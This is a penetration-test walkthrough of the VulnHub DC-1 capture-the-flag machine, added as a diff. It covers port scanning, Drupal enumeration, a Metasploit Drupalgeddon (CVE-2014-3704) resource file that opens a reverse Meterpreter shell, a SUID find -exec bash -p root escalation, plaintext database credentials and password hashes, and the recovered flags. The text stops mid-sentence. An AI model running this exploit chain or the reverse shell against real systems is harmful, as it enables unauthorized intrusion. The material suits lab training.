@@ -1,0 +1,1010 @@
+===============================================================================
+ DC VULNHUB (DC-1) - AUTHORIZED MACHINE WALKTHROUGH
+===============================================================================
+
+Target:          10.0.2.7
+Target name:     DC VulnHub / DC-1
+Target MAC:      08:00:27:03:92:83
+DC IP:           10.0.2.2 (UNVERIFIED - AD/DNS/KDC ports closed)
+Domain:          unknown / no AD evidence on the target
+Attacker:        10.0.2.3/24 on eth0, Kali Linux, hostname "kali"
+Date:            2026-11-27 (IST, UTC+05:30)
+Scope:           all TCP ports on 10.0.2.7; UDP where useful; read-only
+                 DC queries only if 10.0.2.2 came up; no other hosts;
+                 no internet
+Authorization:   owner / CTF lab
+Output:          /home/shrdx/Documents/DC_VulnHub
+
+Tools used:
+  Nmap 7.991
+  Metasploit Framework 6.5.5-dev
+  Gobuster 3.8.2
+  Nikto 2.6.1
+  WhatWeb 0.6.4
+  curl 8.22.0
+  OpenSSH client 10.6p1 Debian-1
+  Python 3.14.8
+
+Result in one line:
+Drupal 7.24 pre-auth SQL injection gave www-data; a SUID /usr/bin/find gave
+euid=0; all five flags were recovered. The DC at 10.0.2.2 stayed down.
+
+===============================================================================
+ LAB TOPOLOGY
+===============================================================================
+
+VirtualBox NAT Network, isolated virtual subnet:
+
+  Attacker  10.0.2.3/24   Kali, eth0
+  Target    10.0.2.7      "DC VulnHub", MAC 08:00:27:03:92:83, port 80 known
+                          open from the pre-scan
+  DC        10.0.2.2      MAC 08:00:27:66:DB:91, UNVERIFIED, no AD services
+                          reachable at the start or end of the session
+
+I confirmed the attacker address with:
+
+  $ ip -brief address
+  lo               UNKNOWN        127.0.0.1/8 ::1/128
+  eth0             UP             10.0.2.3/24 fe80::230e:78ad:62a1:c035/64
+
+The target answered ICMP, but I did not treat that as proof of service health.
+I used -Pn for the scans and checked the actual TCP ports.
+
+===============================================================================
+ QUESTIONS / TASKS
+===============================================================================
+
+No explicit questions were supplied with the engagement. The target turned
+out to contain five flag artefacts, so I treated the task as:
+
+  - enumerate the target,
+  - find every flag,
+  - document how each flag was reached,
+  - obtain the strongest access I could without destructive changes,
+  - leave the target in the same state.
+
+The five flags are listed in Section 8 and in answers.txt.
+
+===============================================================================
+ 1. FIRST CONTACT
+===============================================================================
+
+I started with a normal ping, but only as a reachability hint:
+
+  $ ping -c 4 -W 2 10.0.2.7
+  PING 10.0.2.7 (10.0.2.7) 56(84) bytes of data.
+  64 bytes from 10.0.2.7: icmp_seq=1 ttl=64 time=0.969 ms
+  64 bytes from 10.0.2.7: icmp_seq=2 ttl=64 time=0.507 ms
+  64 bytes from 10.0.2.7: icmp_seq=3 ttl=64 time=0.681 ms
+  64 bytes from 10.0.2.7: icmp_seq=4 ttl=64 time=0.521 ms
+
+  --- 10.0.2.7 ping statistics ---
+  4 packets transmitted, 4 received, 0% packet loss, time 3035ms
+  rtt min/avg/max/mdev = 0.507/0.669/0.969/0.185 ms
+
+I assumed the target was a Linux VM because of the low latency and the
+VirtualBox MAC, but I did not rely on that. The nmap service scan later
+confirmed Linux.
+
+DC CHECK AT START
+-----------------
+
+I re-checked the DC before doing any target work:
+
+  $ nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268,3269,5985 10.0.2.2
+
+  PORT     STATE  SERVICE          VERSION
+  53/tcp   closed domain
+  88/tcp   closed kerberos-sec
+  135/tcp  closed msrpc
+  139/tcp  closed netbios-ssn
+  389/tcp  closed ldap
+  445/tcp  closed microsoft-ds
+  464/tcp  closed kpasswd5
+  636/tcp  closed ldapssl
+  3268/tcp closed globalcatLDAP
+  3269/tcp closed globalcatLDAPssl
+  5985/tcp closed wsman
+  MAC Address: 08:00:27:66:DB:91 (Oracle VirtualBox virtual NIC)
+
+Conclusion: the DC was reachable at the IP layer but had no AD DS, DNS, KDC,
+LDAP, SMB, or WinRM service. I logged it as DOWN/UNVERIFIED and skipped the
+conditional DC query phase entirely. I did not run any DC queries, DCSync,
+AD modifications, or domain-side credential validation.
+
+I re-checked the DC again at the end with the same result:
+
+  $ nmap -Pn -p 53,88,389,445,636,3268 10.0.2.2
+
+  PORT     STATE  SERVICE
+  53/tcp   closed domain
+  88/tcp   closed kerberos-sec
+  389/tcp  closed ldap
+  445/tcp  closed microsoft-ds
+  636/tcp  closed ldapssl
+  3268/tcp closed globalcatLDAP
+
+The target's own /etc/resolv.conf pointed at 192.168.1.1, which is outside
+the lab scope. I did not try to reach it.
+
+===============================================================================
+ 2. PORT SCANNING
+===============================================================================
+
+I did a quick scan first for fast feedback, then a full TCP scan.
+
+QUICK SCAN
+----------
+
+  $ nmap -Pn -T4 --top-ports 1000 --open -oN evidence/quick_ports.txt 10.0.2.7
+
+  PORT    STATE SERVICE
+  22/tcp  open  ssh
+  80/tcp  open  http
+  111/tcp open  rpcbind
+
+FULL TCP SCAN
+-------------
+
+  $ nmap -Pn -p- -T4 --open -oN evidence/ports.txt 10.0.2.7
+
+  Not shown: 65531 closed tcp ports (reset)
+  PORT      STATE SERVICE
+  22/tcp    open  ssh
+  80/tcp    open  http
+  111/tcp   open  rpcbind
+  48036/tcp open  unknown
+  MAC Address: 08:00:27:03:92:83 (Oracle VirtualBox virtual NIC)
+
+The full scan found one port the top-1000 scan did not: 48036/tcp. The
+service scan identified it as the RPC status service, not a separate daemon.
+
+WHAT THE CLOSED PORTS RULE OUT
+------------------------------
+
+The full scan returned reset for 65531 TCP ports. In practical terms:
+
+  - No 139/445 SMB, so no SMB null session, SMB signing, MS17-010, or share
+    enumeration was possible on the target.
+  - No 135 RPC endpoint mapper, no 3389 RDP, no 5985/5986 WinRM.
+  - No 389/636 LDAP, no 88 Kerberos, no 53 DNS, no 3268/3269 global catalog.
+    The target is not acting as the domain controller.
+  - No 21 FTP, no 3306 MySQL, no 5432 PostgreSQL, no 6379 Redis exposed.
+  - No 2049 NFS on TCP; the UDP scan and showmount also failed to find NFS.
+
+The absence of AD ports on 10.0.2.7 is consistent with a standalone Linux
+web server, which is what the hostname and later local enumeration confirmed.
+
+UDP SCAN
+--------
+
+I ran a top-50 UDP scan because port 111 was open:
+
+  $ nmap -Pn -sU --top-ports 50 -T4 -oN evidence/udp_top50.txt 10.0.2.7
+
+  PORT     STATE  SERVICE
+  53/udp   closed domain
+  67/udp   closed dhcps
+  69/udp   closed tftp
+  111/udp  open   rpcbind
+  135/udp  closed msrpc
+  138/udp  closed netbios-dgm
+  631/udp  closed ipp
+  996/udp  closed vsinet
+  998/udp  closed puparp
+  999/udp  closed applix
+  1027/udp closed unknown
+  1434/udp closed ms-sql-m
+  1900/udp closed upnp
+  2048/udp closed dls-monitor
+  2049/udp closed nfs
+  5353/udp closed zeroconf
+
+  Not shown: 34 open|filtered udp ports (no-response)
+
+The 34 open|filtered results are normal UDP ambiguity, not proof of a service.
+The useful fact was 111/udp open and 2049/udp closed. No NFS export was
+available.
+
+===============================================================================
+ 3. SERVICE / VERSION DETECTION
+===============================================================================
+
+I ran version detection and the default scripts against the four open ports:
+
+  $ nmap -Pn -sV -sC -p 22,80,111,48036 \
+      --script=banner,http-title,http-headers,http-robots.txt,rpcinfo \
+      -oN evidence/services.txt 10.0.2.7
+
+Key output:
+
+  PORT      STATE SERVICE VERSION
+  22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+  |_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u7
+  80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
+  | http-headers:
+  |   Server: Apache/2.2.22 (Debian)
+  |   X-Powered-By: PHP/5.4.45-0+deb7u14
+  |   X-Generator: Drupal 7 (http://drupal.org)
+  |   Content-Type: text/html; charset=utf-8
+  |_http-title: Welcome to Drupal Site | Drupal Site
+  111/tcp   open  rpcbind 2-4 (RPC #100000)
+  | rpcinfo:
+  |   100000  2,3,4        111/tcp   rpcbind
+  |   100024  1          48036/tcp   status
+  48036/tcp open  status  1 (RPC #100024)
+  MAC Address: 08:00:27:03:92:83 (Oracle VirtualBox virtual NIC)
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Exact Drupal version:
+After gaining a shell I read the core version constant:
+
+  $ grep -n "define('VERSION'" /var/www/includes/bootstrap.inc
+  11:define('VERSION', '7.24');
+
+That is the version I used for the vulnerability decision. I did not rely on
+the public challenge name or a public write-up.
+
+OS / HOST
+---------
+
+  $ hostname
+  DC-1
+
+  $ uname -a
+  Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux
+
+  $ lsb_release -a
+  Distributor ID: Debian
+  Description:    Debian GNU/Linux 7.11 (wheezy)
+  Release:        7.11
+  Codename:       wheezy
+
+So the "Linux" nmap guess was correct, but the exact distribution and kernel
+came from local commands, not from the nmap guess.
+
+DOMAIN / WORKGROUP
+------------------
+
+  $ hostname -f
+  DC-1
+
+  $ hostname -d
+  (empty)
+
+The target was not domain-joined in any way I could observe. It had local
+accounts only, and the DC had no AD services. Domain: unknown / not applicable.
+
+===============================================================================
+ 4. ENUMERATION BY SERVICE
+===============================================================================
+
+4.1 HTTP - PORT 80
+------------------
+
+I fetched the page and headers:
+
+  $ curl -i -sS http://10.0.2.7/
+
+  HTTP/1.1 200 OK
+  Server: Apache/2.2.22 (Debian)
+  X-Powered-By: PHP/5.4.45-0+deb7u14
+  X-Generator: Drupal 7 (http://drupal.org)
+  Content-Length: 7501
+  Content-Type: text/html; charset=utf-8
+
+The body had:
+
+  <meta name="Generator" content="Drupal 7 (http://drupal.org)" />
+  <title>Welcome to Drupal Site | Drupal Site</title>
+
+There was a standard Drupal login block and a link to /user/register. The
+front page said "No front page content has been created yet." Node 1 was a
+"Main" page containing lorem ipsum, not a flag.
+
+WhatWeb confirmed the stack:
+
+  $ whatweb -v http://10.0.2.7/
+  Summary: Apache[2.2.22], Content-Language[en], Drupal, HTTPServer[Debian
+  Linux][Apache/2.2.22 (Debian)], JQuery, MetaGenerator[Drupal 7
+  (http://drupal.org)], PasswordField[pass], PHP[5.4.45-0+deb7u14],
+  X-Powered-By[PHP/5.4.45-0+deb7u14]
+
+ROBOTS AND MANUAL PROBES
+------------------------
+
+  $ curl -sS http://10.0.2.7/robots.txt
+
+The file had 36 disallowed entries, including /includes/, /misc/, /modules/,
+/profiles/, /scripts/, /themes/, /CHANGELOG.txt, /cron.php, /install.php,
+/update.php, /user/login/, /user/register/, and /xmlrpc.php.
+
+I probed the obvious paths by hand:
+
+  /robots.txt        HTTP 200  1561 bytes
+  /CHANGELOG.txt     HTTP 404   296 bytes
+  /README.txt        HTTP 200  5376 bytes
+  /user/login        HTTP 200  7376 bytes
+  /user/register     HTTP 200  8025 bytes
+  /user/password     HTTP 200  7019 bytes
+  /node/1            HTTP 200 11509 bytes
+  /admin             HTTP 403  7586 bytes
+  /install.php       HTTP 200  3049 bytes
+  /cron.php          HTTP 403  7449 bytes
+  /xmlrpc.php        HTTP 200    42 bytes
+
+  /user/1            HTTP 403  7458 bytes
+  /user/2            HTTP 403  7458 bytes
+  /sites/default/settings.php       HTTP 200  0 bytes
+  /sites/default/settings.php.bak   HTTP 403  306 bytes
+  /sites/default/settings.php~      HTTP 403  303 bytes
+  /.git/HEAD                        HTTP 403  285 bytes
+
+The settings.php request returning 200 with 0 bytes was expected: PHP executed
+the file and produced no output. The backup variants were blocked. I could not
+read settings.php over HTTP at this stage; I read it later through the shell.
+
+The install.php page said "Drupal already installed". The update.php page said
+"Access denied". The user registration form was present, but I did not create
+an account because that would have been an unnecessary state change.
+
+DIRECTORY BRUTE FORCE - PARTIAL / TIMED OUT
+-------------------------------------------
+
+I tried the generic dirb wordlist:
+
+  $ gobuster dir -u http://10.0.2.7/ -w /usr/share/wordlists/dirb/common.txt \
+      -x php,txt,html -t 30 --timeout 10s \
+      -o evidence/gobuster_common.txt
+
+It timed out after 300 seconds. The partial output showed many dotfile 403s,
+/admin 403, and /batch 403. I did not treat that as a complete directory
+listing.
+
+I then tried a Drupal-specific list:
+
+  $ gobuster dir -u http://10.0.2.7/ \
+      -w /usr/share/seclists/Discovery/Web-Content/CMS/Drupal.txt \
+      -t 25 --timeout 8s -b 404 -o evidence/gobuster_drupal.txt
+
+That also timed out. The partial output showed /authorize.php 403,
+/COPYRIGHT.txt 200, and a lot of core/ 403s from a newer-Drupal wordlist. The
+site was Drupal 7, so those core/ paths were not useful. I stopped there rather
+than hammering the old Apache server.
+
+NIKTO - PARTIAL / TIMED OUT
+---------------------------
+
+  $ nikto -host http://10.0.2.7/ -nointeractive \
+      -output evidence/nikto.txt
+
+Nikto timed out after 300 seconds. Its partial output confirmed:
+
+  - Server: Apache/2.2.22 (Debian)
+  - X-Powered-By: PHP/5.4.45-0+deb7u14
+  - ETag inode disclosure on /robots.txt
+  - 36 robots.txt entries
+  - no CGI directories found before the timeout
+
+I am not claiming a full Nikto run. The timeout is recorded in the evidence.
+
+DEFAULT LOGIN TESTS
+-------------------
+
+I fetched a form_build_id and posted two limited attempts to /user/login:
+
+  admin / admin  -> HTTP 200, "Sorry, unrecognized username or password."
+  admin / blank  -> HTTP 200, "Password field is required." plus the same
+                    unrecognized username/password message.
+
+No successful Drupal login was obtained. I did not brute force the login form.
+
+4.2 SSH - PORT 22
+-----------------
+
+I enumerated the SSH configuration with nmap:
+
+  $ nmap -Pn -sV -p22 \
+      --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos \
+      -oN evidence/ssh_enum.txt 10.0.2.7
+
+Key output:
+
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+  | ssh-auth-methods:
+  |   Supported authentication methods:
+  |     publickey
+  |_    password
+  | ssh-hostkey:
+  |   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
+  |   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
+  |_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
+
+The algorithm list included DSA host keys, arcfour, 3des-cbc, blowfish-cbc,
+cast128-cbc, hmac-md5, and diffie-hellman-group1-sha1. That is an old SSH
+configuration, but it was not the intended access path.
+
+Password authentication was enabled. I tested only four default/blank
+combinations, using a temporary SSH_ASKPASS helper because sshpass was not
+installed:
+
+  root / root       -> Permission denied (publickey,password).
+  root / blank      -> Permission denied (publickey,password).
+  flag4 / flag4     -> Permission denied (publickey,password).
+  flag4 / blank     -> Permission denied (publickey,password).
+
+I did not run Hydra or a dictionary attack. There was no evidence of a lockout
+policy, but brute forcing was not necessary and would have been noisy.
+
+4.3 RPC - PORTS 111 AND 48036
+-----------------------------
+
+  $ rpcinfo -p 10.0.2.7
+     program vers proto   port  service
+      100000    4   tcp    111  portmapper
+      100000    3   tcp    111  portmapper
+      100000    2   tcp    111  portmapper
+      100000    4   udp    111  portmapper
+      100000    3   udp    111  portmapper
+      100000    2   udp    111  portmapper
+      100024    1   udp  42970  status
+      100024    1   tcp  48036  status
+
+So 48036/tcp was not a mystery service. It was the rpc.statd status program.
+I checked for NFS exports:
+
+  $ showmount -e 10.0.2.7
+  clnt_create: RPC: Program not registered
+
+  $ rpcinfo -t 10.0.2.7 100024
+  program 100024 version 1 ready and waiting
+
+Conclusion: rpcbind and the status service were exposed, but NFS was not
+registered. There was no mountable share and no NFS-based path to pursue.
+
+4.4 SERVICES NOT PRESENT
+------------------------
+
+I did not run SMB, RDP, LDAP, Kerberos, WinRM, FTP, or database enumeration
+against the target because those ports were closed in the full scan. Running
+those tools would only have produced connection failures, not new evidence.
+The only database access I got was local MySQL through the www-data shell,
+using credentials from settings.php.
+
+===============================================================================
+ 5. FLAGS / ANSWERS FOUND DURING ENUMERATION
+===============================================================================
+
+FLAG 1
+------
+
+Source: /var/www/flag1.txt
+Command: cat /var/www/flag1.txt
+
+  Every good CMS needs a config file - and so do you.
+
+This was in the web root and readable by www-data.
+
+FLAG 2
+------
+
+Source: /var/www/sites/default/settings.php
+The file begins with a comment that literally says "flag2", followed by the
+Drupal database configuration.
+
+  /**
+   *
+   * flag2
+   * Brute force and dictionary attacks aren't the
+   * only ways to gain access (and you WILL need access).
+   * What can you do with these credentials?
+   *
+   */
+
+  $databases = array (
+    'default' =>
+    array (
+      'default' =>
+      array (
+        'database' => 'drupaldb',
+        'username' => 'dbuser',
+        'password' => 'R0ck3t',
+        'host' => 'localhost',
+        'port' => '',
+        'driver' => 'mysql',
+        'prefix' => '',
+      ),
+    ),
+  );
+
+I assumed flag2 was this comment because the file itself labels it "flag2".
+The credentials below it were the actionable part.
+
+FLAG 3
+------
+
+Flag 3 was not a file. It was an unpublished Drupal node in the database.
+
+I queried the node table read-only:
+
+  $ mysql -u dbuser -pR0ck3t -D drupaldb \
+      -e 'select nid,title,type,status from node;'
+
+  nid  title  type  status
+  1    Main   page  1
+  2    flag3  page  0
+
+Status 0 means unpublished, which is why it was not visible on the site.
+Then I read the body:
+
+  $ mysql -u dbuser -pR0ck3t -D drupaldb \
+      -e 'select entity_id, body_value from field_data_body where entity_id=2;'
+
+  entity_id  body_value
+  2          Special PERMS will help FIND the passwd - but you'll need to
+             -exec that command to work out how to get what's in the shadow.
+
+The line wrap above is from the terminal; the exact file is in
+evidence/flag3.txt and evidence/mysql_node_flag3.txt.
+
+FLAG 4
+------
+
+Source: /home/flag4/flag4.txt
+Command: cat /home/flag4/flag4.txt
+
+  Can you use this same method to find or access the flag in root?
+
+  Probably. But perhaps it's not that easy.  Or maybe it is?
+
+The file was owned by local user flag4 but was world-readable. I did not need
+the flag4 password to read it.
+
+FINAL FLAG
+----------
+
+Source: /root/thefinalflag.txt
+Command: cat /root/thefinalflag.txt (through the SUID root shell)
+
+  Well done!!!!
+
+  Hopefully you've enjoyed this and learned some new skills.
+
+  You can let me know what you thought of this little journey
+  by contacting me via Twitter - @DCAU7
+
+===============================================================================
+ 6. CREDENTIALS AND INITIAL ACCESS
+===============================================================================
+
+CREDENTIALS FOUND
+-----------------
+
+From settings.php:
+
+  database: drupaldb
+  username: dbuser
+  password: R0ck3t
+  host:     localhost
+
+I validated them locally through the www-data shell:
+
+  $ mysql -u dbuser -pR0ck3t -D drupaldb \
+      -e 'select uid,name,pass,mail,status from users;'
+
+  uid  name   pass                                                   mail               status
+  0                                                                   0
+  1    admin  $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR  admin@example.com  1
+  2    Fred   $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg  fred@example.org   1
+
+I did not crack either hash. The DB credentials were enough to read the
+unpublished flag3 node, and I already had a shell through the web vulnerability.
+
+DRUPALGEDDON
+------------
+
+Why I chose it:
+The target was Drupal 7.24. Searchsploit had:
+
+  Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection
+  php/webapps/34984.py
+  php/webapps/34992.py
+  php/webapps/34993.php
+  php/webapps/35150.php
+  php/webapps/44355.php
+
+The exact version 7.24 is below the 7.32 fix, so CVE-2014-3704 was the obvious
+pre-auth path. I used the Metasploit module rather than a random public exploit
+because it was already installed, readable, and used a crash-safe form-cache
+method that cleans up its own cache entries.
+
+First I checked whether the module supported a non-exploiting check:
+
+  $ msfconsole -q -x 'use exploit/multi/http/drupal_drupageddon; \
+      set RHOSTS 10.0.2.7; set RPORT 80; set TARGETURI /; check; exit'
+
+  [-] This module does not support check.
+
+That was a dead end. There was no built-in version probe, so I moved to the
+exploit with the exact version already verified.
+
+I used this resource file:
+
+  spool /home/shrdx/Documents/DC_VulnHub/evidence/msf_console.log
+  use exploit/multi/http/drupal_drupageddon
+  set RHOSTS 10.0.2.7
+  set RPORT 80
+  set TARGETURI /
+  set PAYLOAD php/meterpreter/reverse_tcp
+  set LHOST 10.0.2.3
+  set LPORT 4444
+  set ExitOnSession false
+  set Wait 5
+  exploit -j
+  sleep 20
+  sessions -l
+  sleep 600
+
+Metasploit warned that ExitOnSession was an unknown datastore option. That was
+harmless for this run; the session still opened. The output was:
+
+  [*] Exploit running as background job 0.
+  [*] Exploit completed, but no session was created.
+  [*] Started reverse TCP handler on 10.0.2.3:4444
+  [*] Sending stage (72682 bytes) to 10.0.2.7
+  [*] Meterpreter session 1 opened (10.0.2.3:4444 -> 10.0.2.7:44755)
+      at 2026-11-27 11:16:06 +0530
+
+  Active sessions
+  ===============
+    Id  Name  Type                  Information      Connection
+    --  ----  ----                  -----------      ----------
+    1         meterpreter php/linux  www-data @ DC-1  10.0.2.3:4444 -> 10.0.2.7:44755
+
+The "Exploit completed, but no session was created" line was printed before
+the handler had accepted the staged connection; the session list immediately
+after it showed session 1. I did not treat the first line as a failure.
+
+WHY THIS METHOD
+---------------
+
+The module's default form-cache method injects two cache entries through the
+login form's SQL injection, triggers the cached form, and runs the PHP payload.
+It then calls cache_clear_all for the generated form IDs. It does not create a
+Drupal user, does not change the admin password, and does not write a webshell
+to disk.
+
+I did not independently diff the cache_form table. I relied on the module's
+cache_clear_all call, and I confirmed the users table still contained only the
+original accounts (uid 0, admin, and Fred).
+
+I did not use the user-post method because that would have created an admin
+account and content. The form-cache method was the smaller state change.
+
+SESSION
+-------
+
+  meterpreter > sysinfo
+  Computer        : DC-1
+  OS              : Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686
+  Architecture    : i686
+  System Language : C
+  Meterpreter     : php/linux
+
+  meterpreter > getuid
+  Server username: www-data
+
+  meterpreter > pwd
+  /var/www
+
+  $ id
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+The Meterpreter ls command showed corrupted sizes and dates (for example a
+file size of 747324309678 and a year 188498731153). That is a 32-bit PHP agent
+artifact. I used shell cat/ls output for the evidence instead of trusting those
+fields.
+
+===============================================================================
+ 7. LOCAL ENUMERATION AND PRIVILEGE ESCALATION
+===============================================================================
+
+LOCAL USERS
+-----------
+
+  $ cat /etc/passwd
+
+Relevant lines:
+
+  www-data:x:33:33:www-data:/var/www:/bin/sh
+  mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
+  flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
+
+The flag4 account was a real local account. Its home directory was:
+
+  $ ls -la /home/flag4
+  -rw------- 1 flag4 flag4   28 Feb 19  2019 .bash_history
+  -rw-r--r-- 1 flag4 flag4  220 Feb 19  2019 .bash_logout
+  -rw-r--r-- 1 flag4 flag4 3392 Feb 19  2019 .bashrc
+  -rw-r--r-- 1 flag4 flag4  675 Feb 19  2019 .profile
+  -rw-r--r-- 1 flag4 flag4  125 Feb 19  2019 flag4.txt
+
+I could read flag4.txt but not .bash_history or /root.
+
+SUID ENUMERATION
+----------------
+
+  $ find / -xdev -perm -4000 -type f 2>/dev/null
+
+  /bin/mount
+  /bin/ping
+  /bin/su
+  /bin/ping6
+  /bin/umount
+  /usr/bin/at
+  /usr/bin/chsh
+  /usr/bin/passwd
+  /usr/bin/newgrp
+  /usr/bin/chfn
+  /usr/bin/gpasswd
+  /usr/bin/procmail
+  /usr/bin/find
+  /usr/sbin/exim4
+  /usr/lib/pt_chown
+  /usr/lib/openssh/ssh-keysign
+  /usr/lib/eject/dmcrypt-get-device
+  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+  /sbin/mount.nfs
+
+The important one was /usr/bin/find. It is not normally SUID, so this was a
+deliberate challenge misconfiguration.
+
+I checked sudo first, but it was not installed:
+
+  $ sudo -l
+  /bin/sh: 8: sudo: not found
+
+FIRST ATTEMPT - FAILED
+----------------------
+
+I tried the common GTFOBins command:
+
+  $ /usr/bin/find . -maxdepth 0 -exec /bin/sh -p \; -quit
+  /bin/sh: 0: Illegal option -p
+
+Debian's /bin/sh is dash, and this dash build rejected -p. No shell was
+obtained. That was a dead end, not a failure of the SUID bit.
+
+SECOND ATTEMPT - SUCCESS
+------------------------
+
+I used bash, which supports -p:
+
+  $ /usr/bin/find . -maxdepth 0 -exec /bin/bash -p \; -quit
+
+  $ id
+  uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
+
+The real UID stayed 33, but the effective UID was 0. That was enough to read
+root-owned files. I did not change the root password, add a user, or install
+anything.
+
+ROOT FLAG
+---------
+
+  $ cat /root/thefinalflag.txt
+
+  Well done!!!!
+
+  Hopefully you've enjoyed this and learned some new skills.
+
+  You can let me know what you thought of this little journey
+  by contacting me via Twitter - @DCAU7
+
+  $ ls -la /root
+  drwx------ 4 root root 4096 Feb 28  2019 .
+  drwxr-xr-x 23 root root 4096 Feb 19  2019 ..
+  drwx------ 2 root root 4096 Feb 19  2019 .aptitude
+  -rw------- 1 root root   44 Feb 28  2019 .bash_history
+  -rw-r--r-- 1 root root  949 Feb 19  2019 .bashrc
+  drwxr-xr-x 3 root root 4096 Feb 19  2019 .drush
+  -rw-r--r-- 1 root root  140 Nov 20  2007 .profile
+  -rw-r--r-- 1 root root  173 Feb 19  2019 thefinalflag.txt
+
+I did not read the root .bash_history; it was not needed for the flag or the
+access path.
+
+===============================================================================
+ 8. FINAL ANSWER KEY
+===============================================================================
+
+No explicit questions were supplied. The five recovered flags are:
+
+  #   FLAG / ANSWER                                                        SOURCE
+  --  -------------------------------------------------------------------  ------------------------------------------
+  1   Every good CMS needs a config file - and so do you.                   /var/www/flag1.txt
+  2   Brute force and dictionary attacks aren't the only ways to gain      /var/www/sites/default/settings.php
+      access (and you WILL need access). What can you do with these        (comment labeled flag2)
+      credentials?
+      DB: drupaldb / dbuser / R0ck3t
+  3   Special PERMS will help FIND the passwd - but you'll need to         Drupal DB, field_data_body.entity_id=2
+      -exec that command to work out how to get what's in the shadow.      (node nid=2, title=flag3, unpublished)
+  4   Can you use this same method to find or access the flag in root?     /home/flag4/flag4.txt
+      Probably. But perhaps it's not that easy.  Or maybe it is?
+  5   Well done!!!! ... contact @DCAU7                                     /root/thefinalflag.txt
+
+The exact file copies are in evidence/flag1.txt, evidence/flag2.txt,
+evidence/flag3.txt, evidence/flag4.txt, and evidence/thefinalflag.txt.
+
+===============================================================================
+ 9. VULNERABILITIES / WEAKNESSES USED
+===============================================================================
+
+1. Drupal 7.24 pre-authentication SQL injection (CVE-2014-3704,
+   "Drupalgeddon")
+   The login form's name parameter was passed through Drupal's
+   expandArguments() without safe handling. The Metasploit form-cache method
+   used this to inject serialized form data and execute PHP as www-data.
+   This was the initial access.
+
+2. Sensitive configuration in the web root
+   /var/www/sites/default/settings.php contained the flag2 comment and the
+   MySQL credentials dbuser:R0ck3t. Anyone with file read or RCE could use
+   them. The file was not readable over HTTP directly, but it was readable
+   after the web shell.
+
+3. Unpublished content still stored in the database
+   Flag 3 was an unpublished Drupal node. The web UI hid it, but the database
+   credentials exposed the body through a simple SELECT. Unpublished does not
+   mean secret.
+
+4. SUID root /usr/bin/find
+   The binary was SUID root. find's -exec option inherited the effective UID,
+   so /bin/bash -p produced euid=0. This was the privilege escalation. The
+   flag 3 and flag 4 text both hinted at this exact path.
+
+5. End-of-life software stack
+   Debian 7.11, Apache 2.2.22, PHP 5.4.45, Drupal 7.24, and OpenSSH 6.0p1
+   were all long past end of life. The SSH server also offered DSA host keys,
+   arcfour, 3des, blowfish, cast128, hmac-md5, and diffie-hellman-group1-sha1.
+   The old stack was not just cosmetic; it enabled the Drupal exploit.
+
+6. Exposed rpcbind / status service
+   Port 111 and 48036/tcp exposed rpcbind and rpc.statd. There was no NFS
+   export, so this did not lead to access, but it was unnecessary exposure on
+   a web server.
+
+===============================================================================
+ 10. DEAD ENDS / WHAT DID NOT WORK
+===============================================================================
+
+- ICMP was not used as proof of service health. The real scan was -Pn.
+- Port 80 was already known open; the full scan added 22, 111, and 48036.
+- The DC at 10.0.2.2 was reachable but had all checked AD/DNS/KDC ports
+  closed. I skipped Phase 2b entirely. There was no domain context to query.
+- /CHANGELOG.txt returned 404. The exact Drupal version had to come from
+  includes/bootstrap.inc after the shell.
+- /sites/default/settings.php returned HTTP 200 with 0 bytes over the web.
+  PHP executed it; it was not directly downloadable.
+- settings.php.bak, settings.php~, .git/HEAD, and the .info files were 403.
+- /user/1, /user/2, /admin, /cron.php, and /update.php were 403.
+- install.php was reachable but only said "Drupal already installed".
+- admin/admin and admin/blank Drupal logins failed.
+- root/root, root/blank, flag4/flag4, and flag4/blank SSH logins failed.
+- The generic gobuster run timed out after 300 seconds.
+- The Drupal-specific gobuster run timed out after 300 seconds; its partial
+  output included paths from newer Drupal versions that did not apply.
+- Nikto timed out after 300 seconds; only partial findings were recorded.
+- The Metasploit drupal_drupageddon module has no "check" method. The attempt
+  returned "This module does not support check."
+- The first SUID find command used /bin/sh -p and failed with
+  "/bin/sh: 0: Illegal option -p". /bin/bash -p worked.
+- The first attempt to download /root/thefinalflag.txt with Meterpreter
+  failed with "stdapi_fs_stat: Operation failed: 1" because Meterpreter was
+  www-data, not root. I copied the file to /tmp through the SUID shell first.
+- The first cleanup attempt ran as www-data and could not delete the
+  root-owned /tmp copies. A second cleanup through the SUID shell succeeded.
+- All direct MySQL queries were SELECT-only. The only database writes were the
+  Drupalgeddon cache_form inserts performed by the exploit; the module's
+  payload calls cache_clear_all for its generated form IDs. I did not diff the
+  cache table independently.
+- The Meterpreter ls output had corrupted size/date fields. I did not use
+  those fields as evidence.
+- NFS was not present. showmount returned "Program not registered".
+- No SMB, RDP, LDAP, Kerberos, WinRM, FTP, or exposed database service was
+  available on the target.
+
+===============================================================================
+ 11. WHAT I LEARNED
+===============================================================================
+
+The box is a good reminder that "old but working" is still dangerous. The
+Drupal version was five years behind the fix for Drupalgeddon, and the whole
+stack was Debian 7. The web application gave a low-privilege shell, but the
+real escalation was a single SUID binary that should never have been SUID.
+
+The flag design also made a point: unpublished content is not protected
+content. Flag 3 was hidden from the site but fully readable with the database
